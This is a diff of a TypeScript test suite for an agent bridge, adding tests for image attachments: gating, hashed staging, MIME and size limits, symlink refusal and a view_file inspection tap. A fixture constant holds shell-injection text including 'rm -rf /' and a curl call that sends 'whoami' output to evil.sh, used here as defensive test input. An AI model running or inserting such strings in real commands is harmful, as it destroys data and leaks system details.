@@ -15,7 +15,8 @@
 import { describe, expect, test } from "bun:test";
 import { EventEmitter } from "node:events";
 import { Readable, Writable } from "node:stream";
-import { existsSync, readFileSync, readdirSync } from "node:fs";
+import { createHash } from "node:crypto";
+import { existsSync, mkdirSync, readFileSync, readdirSync, symlinkSync, utimesSync, writeFileSync } from "node:fs";
 import { mkdtemp } from "node:fs/promises";
 import { join } from "node:path";
 import { tmpdir } from "node:os";
@@ -58,7 +59,7 @@ const SUCCESS = (conversationId: string, response = "all done") => ({
 
 /** Minimal ChildProcess stand-in: scripted NDJSON lines, optional stdin capture, then exit/close. */
 // eslint-disable-next-line @typescript-eslint/no-explicit-any
-function fakeChild(opts: { lines?: unknown[]; exit?: number | null; hold?: boolean; stdin?: boolean }) {
+function fakeChild(opts: { lines?: unknown[]; exit?: number | null; hold?: boolean; stdin?: boolean; rawLines?: string[] }) {
 	// eslint-disable-next-line @typescript-eslint/no-explicit-any
 	const child: any = new EventEmitter();
 	child.stdout = new Readable({ read() {} });
@@ -82,6 +83,9 @@ function fakeChild(opts: { lines?: unknown[]; exit?: number | null; hold?: boole
 	for (const line of opts.lines ?? []) {
 		child.stdout.push(Buffer.from(`${JSON.stringify(line)}\n`));
 	}
+	for (const raw of opts.rawLines ?? []) {
+		child.stdout.push(Buffer.from(`${raw}\n`));
+	}
 	if (!opts.hold) setTimeout(() => child.emit("close", opts.exit ?? 0, null), 10);
 	return child;
 }
@@ -98,7 +102,12 @@ interface SpawnRecord {
 
 async function setup(
 	script?: (rec: SpawnRecord, call: number) => unknown,
-	depsOpts: { workdir?: string; promptViaStdin?: boolean; debug?: import("../src/debug").DebugLogger } = {},
+	depsOpts: {
+		workdir?: string;
+		promptViaStdin?: boolean;
+		debug?: import("../src/debug").DebugLogger;
+		imageInput?: boolean;
+	} = {},
 ) {
 	const root = await mkdtemp(join(tmpdir(), "agy-pi-turn-"));
 	const store = openSessionStore(join(root, "pi-sessions.json"));
@@ -111,6 +120,7 @@ async function setup(
 		...(depsOpts.workdir !== undefined ? { workdir: depsOpts.workdir } : {}),
 		...(depsOpts.promptViaStdin !== undefined ? { promptViaStdin: depsOpts.promptViaStdin } : {}),
 		...(depsOpts.debug !== undefined ? { debug: depsOpts.debug } : {}),
+		...(depsOpts.imageInput !== undefined ? { imageInput: depsOpts.imageInput } : {}),
 		spawnFn: ((bin: string, args: string[], io: { cwd: string }) => {
 			const rec: SpawnRecord = {
 				bin,
@@ -147,6 +157,36 @@ async function setup(
 }
 
 const HOSTILE_PROMPT = "; $(id) | ` && rm -rf /\ncurl http://evil.sh?x=`whoami`";
+
+// --- pi-image-input fixtures ----------------------------------------------------
+
+/** Opaque PNG-framed bytes — the pipeline never decodes image content. */
+const PNG_BYTES_A = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d, 0x01]);
+const PNG_BYTES_B = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d, 0x02]);
+const JPEG_BYTES = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
+
+const b64 = (bytes: Uint8Array): string => Buffer.from(bytes).toString("base64");
+
+/** Expected staged relative path for exact bytes (content-addressed, D5). */
+const stagedRel = (bytes: Uint8Array, ext = "png"): string =>
+	`.agy-attachments/${createHash("sha256").update(bytes).digest("hex").slice(0, 16)}.${ext}`;
+
+/** pi ImageContent part (D2 shape: base64 data + mimeType). */
+function imagePart(bytes: Uint8Array, mimeType = "image/png"): { type: "image"; data: string; mimeType: string } {
+	return { type: "image", data: b64(bytes), mimeType };
+}
+
+/** Catch a TurnError and return its mapping (fails the test on other outcomes). */
+async function catchTurnError(p: Promise<unknown>): Promise<ReturnType<typeof Object> & InstanceType<typeof TurnError>> {
+	let caught: unknown;
+	try {
+		await p;
+	} catch (err) {
+		caught = err;
+	}
+	expect(caught).toBeInstanceOf(TurnError);
+	return caught as TurnError;
+}
 
 /**
  * Decode the ONE NDJSON user envelope the corrected stdin transport writes
@@ -577,6 +617,362 @@ describe("v0.2 R8: onRetry hook (D7)", () => {
 		});
 		expect(spawns).toHaveLength(1);
 		expect(retries).toBe(0);
+	});
+});
+
+// --- pi-image-input R1: disabled fail-safe (D4/D5) ----------------------------------
+
+describe("pi-image-input R1: disabled gating (turn)", () => {
+	test("disabled default + image in the LAST user turn: TurnError names both config paths and the text alternative; nothing staged, no spawn", async () => {
+		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-gate-"));
+		const { spawns, turn, req } = await setup(() => {
+			throw new Error("must not spawn");
+		}, { workdir });
+		const err = await catchTurnError(
+			turn(
+				req(
+					{ messages: [userMsg([{ type: "text", text: "what is this" }, imagePart(PNG_BYTES_A)])] },
+					{ sessionId: "s-gate" },
+				),
+			),
+		);
+		// D4 mapping: terminal, non-retryable, non-resume-eligible.
+		expect(err.mapping.finalize).toBe("error");
+		expect(err.mapping.retryable).toBe(false);
+		expect(err.mapping.resumeEligible).toBe(false);
+		// Actionable message: BOTH pi config paths + the text alternative.
+		expect(err.mapping.message).toContain(".pi/agy-bridge.json");
+		expect(err.mapping.message).toContain("~/.pi/agent/agy-bridge.json");
+		expect(err.mapping.message).toMatch(/describe.*image.*text|text instead/i);
+		// Spec R1: nothing MAY be staged and the agent MUST NOT be spawned.
+		expect(spawns).toHaveLength(0);
+		expect(existsSync(join(workdir, ".agy-attachments"))).toBe(false);
+	});
+
+	test("explicit imageInput: false behaves identically to the absent flag (triangulation)", async () => {
+		const { spawns, turn, req } = await setup(() => {
+			throw new Error("must not spawn");
+		}, { imageInput: false });
+		const err = await catchTurnError(turn(req({ messages: [userMsg([imagePart(PNG_BYTES_A)])] }, { sessionId: "s-gate-f" })));
+		expect(err.mapping.finalize).toBe("error");
+		expect(err.mapping.message).toContain(".pi/agy-bridge.json");
+		expect(spawns).toHaveLength(0);
+	});
+
+	test("disabled + TEXT-only turn: no gate trip — the turn runs and succeeds normally", async () => {
+		const { spawns, turn, req } = await setup();
+		const result = await turn(req({ messages: [userMsg("plain question")] }, { sessionId: "s-gate-text" }));
+		expect(result.classification.outcome).toBe("success");
+		expect(spawns).toHaveLength(1);
+	});
+
+	test("disabled + image only in an EARLIER turn: proceeds (the gate is last-user-turn scoped, matching extraction)", async () => {
+		const { spawns, turn, req } = await setup();
+		const context: Context = {
+			messages: [userMsg([imagePart(PNG_BYTES_A)]), assistantMsg("prior answer"), userMsg("follow-up text")],
+		};
+		const result = await turn(req(context, { sessionId: "s-gate-hist" }));
+		expect(result.classification.outcome).toBe("success");
+		expect(spawns).toHaveLength(1);
+		// The historical image follows the engine's drop-by-design path (seed
+		// placeholder), never the rejection path.
+		expect(result.prompt).toBe("follow-up text");
+	});
+});
+
+// --- pi-image-input R2–R4: extraction, staging, directive, cloned context (D5) -------
+
+describe("pi-image-input R2–R4: extraction/staging/directive (turn)", () => {
+	test("enabled + text+image turn: stages exact bytes under a content-derived name; directive prepended to the prompt; RAW hashes bound", async () => {
+		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-stage-"));
+		const { store, spawns, turn, req } = await setup(
+			() => fakeChild({ lines: [{ event: "init", conversation_id: "c-img" }, SUCCESS("c-img")], stdin: true }),
+			{
+				workdir,
+				imageInput: true,
+			},
+		);
+		const rawContent = [{ type: "text" as const, text: "what is this" }, imagePart(PNG_BYTES_A)];
+		const result = await turn(
+			req({ messages: [userMsg(rawContent)] }, { sessionId: "s-img1" }),
+		);
+		expect(result.classification.outcome).toBe("success");
+		// R2: one image extracted with its bytes and media type → staged.
+		const rel = stagedRel(PNG_BYTES_A);
+		expect(result.stagedAttachments).toEqual([rel]);
+		const stagedAbs = join(workdir, rel);
+		expect(existsSync(stagedAbs)).toBe(true);
+		expect(new Uint8Array(readFileSync(stagedAbs))).toEqual(PNG_BYTES_A);
+		// R4: the deterministic directive is PREPENDED to the mapped prompt.
+		expect(result.prompt).toBe(
+			`[Attached user image: ${rel}]\nPlease inspect each attached image above with view_file before responding.\n\nwhat is this`,
+		);
+		// Spawned with the directive-carrying prompt and the workdir authority.
+		expect(spawns).toHaveLength(1);
+		expect(spawns[0].args[spawns[0].args.indexOf("--print") + 1]).toBe(result.prompt);
+		expect(spawns[0].cwd).toBe(workdir);
+		// D5: the baseline hashes the RAW incoming array (image included) —
+		// same visible thread → same divergence identity, image or not.
+		expect(await store.getEntry("s-img1")).toEqual({
+			conversationId: "c-img",
+			hashes: messageHashes([{ role: "user", content: rawContent }]),
+		});
+		// R6 (inspection feedback): staged but not yet inspected.
+		expect(result.attachmentsInspected).toBe(false);
+	});
+
+	test("two images stage under distinct content-derived refs; the directive names BOTH (spec staging scenario)", async () => {
+		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-stage2-"));
+		const { turn, req } = await setup(() => fakeChild({ lines: [SUCCESS("c-2img")], stdin: true }), {
+			workdir,
+			imageInput: true,
+		});
+		const result = await turn(
+			req(
+				{
+					messages: [
+						userMsg([imagePart(PNG_BYTES_A), { type: "text", text: "compare these" }, imagePart(PNG_BYTES_B)]),
+					],
+				},
+				{ sessionId: "s-img2" },
+			),
+		);
+		const relA = stagedRel(PNG_BYTES_A);
+		const relB = stagedRel(PNG_BYTES_B);
+		expect(relA).not.toBe(relB);
+		expect(result.stagedAttachments).toEqual([relA, relB]);
+		expect(result.prompt).toContain(`[Attached user image: ${relA}]`);
+		expect(result.prompt).toContain(`[Attached user image: ${relB}]`);
+		expect(result.prompt).toContain("Please inspect each attached image above with view_file before responding.");
+		expect(result.prompt).toContain("compare these");
+	});
+
+	test("image-only turn (no text parts): still stages, prompt is the directive alone, turn succeeds", async () => {
+		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-only-"));
+		const { spawns, turn, req } = await setup(() => fakeChild({ lines: [SUCCESS("c-only")], stdin: true }), {
+			workdir,
+			imageInput: true,
+		});
+		const result = await turn(req({ messages: [userMsg([imagePart(JPEG_BYTES, "image/jpeg")])] }, { sessionId: "s-only" }));
+		const rel = stagedRel(JPEG_BYTES, "jpg");
+		expect(result.stagedAttachments).toEqual([rel]);
+		expect(result.prompt).toBe(
+			`[Attached user image: ${rel}]\nPlease inspect each attached image above with view_file before responding.`,
+		);
+		expect(spawns).toHaveLength(1);
+		expect(result.classification.outcome).toBe("success");
+	});
+
+	test("unsupported part (image + PDF) rejects all-or-nothing: TurnError names the type, nothing staged, no spawn", async () => {
+		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-unsup-"));
+		const { spawns, turn, req } = await setup(() => {
+			throw new Error("must not spawn");
+		}, { workdir, imageInput: true });
+		const err = await catchTurnError(
+			turn(
+				req(
+					{
+						messages: [
+							// Boundary cast (house precedent): pi's closed content union
+							// has no `file` part, but a hostile/host payload can carry
+							// one at runtime — the engine's open PromptPart accepts it.
+							userMsg(
+								[
+									imagePart(PNG_BYTES_A),
+									{ type: "file", data: b64(new Uint8Array([1, 2, 3])), mediaType: "application/pdf" },
+								] as unknown as UserMessage["content"],
+							),
+						],
+					},
+					{ sessionId: "s-unsup" },
+				),
+			),
+		);
+		expect(err.mapping.finalize).toBe("error");
+		expect(err.mapping.retryable).toBe(false);
+		expect(err.mapping.message).toContain("application/pdf");
+		expect(err.mapping.message).toMatch(/png, jpeg, gif and webp/);
+		expect(spawns).toHaveLength(0);
+		expect(existsSync(join(workdir, ".agy-attachments"))).toBe(false);
+	});
+
+	test("hostile mimeType on the image part itself is unsupported (threat 1)", async () => {
+		const { spawns, turn, req } = await setup(() => {
+			throw new Error("must not spawn");
+		}, { imageInput: true });
+		const err = await catchTurnError(
+			turn(req({ messages: [userMsg([imagePart(PNG_BYTES_A, "image/x-virus")])] }, { sessionId: "s-hostile" })),
+		);
+		expect(err.mapping.message).toContain("image/x-virus");
+		expect(spawns).toHaveLength(0);
+	});
+
+	test("oversized image (>20 MB) rejects with the cap guidance before staging or spawn (threat 2)", async () => {
+		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-big-"));
+		const { spawns, turn, req } = await setup(() => {
+			throw new Error("must not spawn");
+		}, { workdir, imageInput: true });
+		const huge = new Uint8Array(20 * 1024 * 1024 + 1);
+		const err = await catchTurnError(
+			turn(req({ messages: [userMsg([imagePart(huge)])] }, { sessionId: "s-big" })),
+		);
+		expect(err.mapping.message).toContain("20 MB");
+		expect(spawns).toHaveLength(0);
+		expect(existsSync(join(workdir, ".agy-attachments"))).toBe(false);
+	});
+
+	test("staging sweeps stale attachments (7-day window): aged hash-named entry pruned, fresh staging and unrelated files survive", async () => {
+		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-prune-"));
+		const dir = join(workdir, ".agy-attachments");
+		mkdirSync(dir);
+		writeFileSync(join(dir, "deadbeefdeadbeef.png"), "old");
+		writeFileSync(join(dir, "not-a-staged-name.txt"), "foreign"); // never touched (foreign namespace)
+		const aged = new Date(Date.now() - 8 * 24 * 60 * 60 * 1000);
+		utimesSync(join(dir, "deadbeefdeadbeef.png"), aged, aged);
+		const { turn, req } = await setup(() => fakeChild({ lines: [SUCCESS("c-prune")], stdin: true }), {
+			workdir,
+			imageInput: true,
+		});
+		await turn(req({ messages: [userMsg([imagePart(PNG_BYTES_A)])] }, { sessionId: "s-prune" }));
+		expect(existsSync(join(dir, "deadbeefdeadbeef.png"))).toBe(false);
+		expect(existsSync(join(dir, "not-a-staged-name.txt"))).toBe(true);
+		expect(existsSync(join(workdir, stagedRel(PNG_BYTES_A)))).toBe(true);
+	});
+
+	test("symlinked .agy-attachments dir refuses to stage: TurnError (never a raw engine error), no spawn (threat 3)", async () => {
+		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-sym-"));
+		const target = await mkdtemp(join(tmpdir(), "agy-pi-sym-target-"));
+		symlinkSync(target, join(workdir, ".agy-attachments"));
+		const { spawns, turn, req } = await setup(() => {
+			throw new Error("must not spawn");
+		}, { workdir, imageInput: true });
+		const err = await catchTurnError(
+			turn(req({ messages: [userMsg([imagePart(PNG_BYTES_A)])] }, { sessionId: "s-sym" })),
+		);
+		expect(err.mapping.finalize).toBe("error");
+		expect(err.mapping.message).toContain("symlink");
+		expect(spawns).toHaveLength(0);
+		expect(readdirSync(target)).toEqual([]); // nothing escaped the workdir
+	});
+
+	test("R7 re-seed: an EARLIER image turn renders the compact placeholder in the seeded prompt — never raw bytes", async () => {
+		const { store, turn, req } = await setup(() => fakeChild({ lines: [SUCCESS("c-reseed")], stdin: true }), {
+			imageInput: true,
+		});
+		await store.bind("s-reseed", "conv-stale", ["deadbeef"]); // forces divergence
+		const secret = b64(PNG_BYTES_B);
+		const context: Context = {
+			systemPrompt: "SYS",
+			messages: [userMsg([imagePart(PNG_BYTES_B)]), assistantMsg("old answer"), userMsg("new question")],
+		};
+		const result = await turn(req(context, { sessionId: "s-reseed" }));
+		expect(result.diverged).toBe(true);
+		expect(result.prompt).toContain("[user attached an image — not re-embedded]");
+		expect(result.prompt).not.toContain(secret); // no raw payload re-embedded
+		expect(result.prompt).toContain("new question");
+	});
+});
+
+// --- pi-image-input R6: inspection tap (D7) + NDJSON fixture proof (design open Q) ---
+
+/**
+ * Fixture: packages/pi-adapter/tests/fixtures/agy-view-file-steps.ndjson
+ *
+ * Provenance (no agy binary exists in CI, so the fixture transcribes the
+ * REAL-binary line shapes already recorded in-repo): the raw step_update
+ * lines pinned in opencode-adapter/tests/language-model.test.ts (recorded
+ * against the real binary) show agy emits tool steps as
+ * {"step_update":{...,"tool_name":"view_file","tool_info":{"path":...}}}
+ * — WITHOUT an `event` wrapper — while init/result lines carry `event`.
+ * The engine's live-probe note (spawn.ts DEFAULT_STALL_MS evidence)
+ * confirms the init → step_update… → result ordering.
+ */
+describe("pi-image-input R6: view_file tap matcher vs the recorded stream shape (task 3.4)", () => {
+	const FIXTURE = join(import.meta.dir, "fixtures", "agy-view-file-steps.ndjson");
+	const STAGED_BASENAME = "9f86d081884c7d21.png";
+
+	test("every recorded view_file line satisfies the opencode raw-line matcher (includes view_file + staged basename where applicable)", () => {
+		const lines = readFileSync(FIXTURE, "utf8").split("\n").filter((l) => l !== "");
+		expect(lines.length).toBeGreaterThanOrEqual(6);
+		const viewFileLines = lines.filter((l) => l.includes('"tool_name":"view_file"'));
+		// The matcher's first conjunct holds for EVERY recorded view_file line.
+		expect(viewFileLines.length).toBe(3);
+		for (const line of viewFileLines) expect(line.includes("view_file")).toBe(true);
+		// Second conjunct: the staged-name lines name the staged basename in
+		// tool_info.path; the unrelated-path line does not.
+		const staged = viewFileLines.filter((l) => l.includes(STAGED_BASENAME));
+		expect(staged.length).toBe(2);
+		expect(staged.every((l) => l.includes(`.agy-attachments/${STAGED_BASENAME}`))).toBe(true);
+		const unrelated = viewFileLines.find((l) => l.includes("src/other.ts"));
+		expect(unrelated?.includes(STAGED_BASENAME)).toBe(false);
+		// pi-side tolerance: the tap's stepUpdateOf lookup (parsed["step_update"])
+		// resolves the payload on the real-binary shape — no `event` key needed.
+		for (const line of viewFileLines) {
+			const parsed = JSON.parse(line) as Record<string, unknown>;
+			const inner = parsed["step_update"] as Record<string, unknown> | undefined;
+			expect(inner).toBeDefined();
+			expect(inner?.["tool_name"]).toBe("view_file");
+		}
+	});
+});
+
+describe("pi-image-input R6: inspection tap tracks view_file on staged names (turn)", () => {
+	/** Real-binary-shaped raw line for a tool step (no event wrapper). */
+	const toolLine = (tool: string, path: string): string =>
+		`{"step_update":{"conversation_id":"c-tap","step_index":1,"state":"ACTIVE","step_type":"tool","tool_name":"${tool}","tool_info":{"path":"${path}"}}}`;
+
+	test("view_file naming the staged basename flips attachmentsInspected (real-binary raw shape)", async () => {
+		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-tap-"));
+		const rel = stagedRel(PNG_BYTES_A);
+		const { turn, req } = await setup(
+			() => fakeChild({ lines: [{ event: "init", conversation_id: "c-tap" }, SUCCESS("c-tap")], rawLines: [toolLine("view_file", rel)], stdin: true }),
+			{ workdir, imageInput: true },
+		);
+		const result = await turn(req({ messages: [userMsg([imagePart(PNG_BYTES_A)])] }, { sessionId: "s-tap1" }));
+		expect(result.stagedAttachments).toEqual([rel]);
+		expect(result.attachmentsInspected).toBe(true);
+	});
+
+	test("view_file on an UNRELATED path never flips; another tool on the staged path never flips (both conjuncts required)", async () => {
+		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-tap2-"));
+		const rel = stagedRel(PNG_BYTES_A);
+		const { turn, req } = await setup(
+			() =>
+				fakeChild({
+					lines: [{ event: "init", conversation_id: "c-tap2" }, SUCCESS("c-tap2")],
+					rawLines: [toolLine("view_file", "src/other.ts"), toolLine("cat", rel)],
+					stdin: true,
+				}),
+			{ workdir, imageInput: true },
+		);
+		const result = await turn(req({ messages: [userMsg([imagePart(PNG_BYTES_A)])] }, { sessionId: "s-tap2" }));
+		expect(result.attachmentsInspected).toBe(false);
+	});
+
+	test("pi's event-wrapped fixture shape ALSO flips the tap (shape tolerance both ways)", async () => {
+		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-tap3-"));
+		const rel = stagedRel(PNG_BYTES_A);
+		const { turn, req } = await setup(
+			() =>
+				fakeChild({
+					lines: [
+						{ event: "init", conversation_id: "c-tap3" },
+						{ event: "step_update", step_update: { step_type: "tool", state: "DONE", tool_name: "view_file", tool_info: { path: rel }, duration_seconds: 0.3 } },
+						SUCCESS("c-tap3"),
+					],
+					stdin: true,
+				}),
+			{ workdir, imageInput: true },
+		);
+		const result = await turn(req({ messages: [userMsg([imagePart(PNG_BYTES_A)])] }, { sessionId: "s-tap3" }));
+		expect(result.attachmentsInspected).toBe(true);
+	});
+
+	test("nothing staged: attachmentsInspected is vacuously true with no stagedAttachments field", async () => {
+		const { turn, req } = await setup();
+		const result = await turn(req({ messages: [userMsg("text only")] }, { sessionId: "s-tap4" }));
+		expect(result.stagedAttachments).toBeUndefined();
+		expect(result.attachmentsInspected).toBe(true);
 	});
 });
 
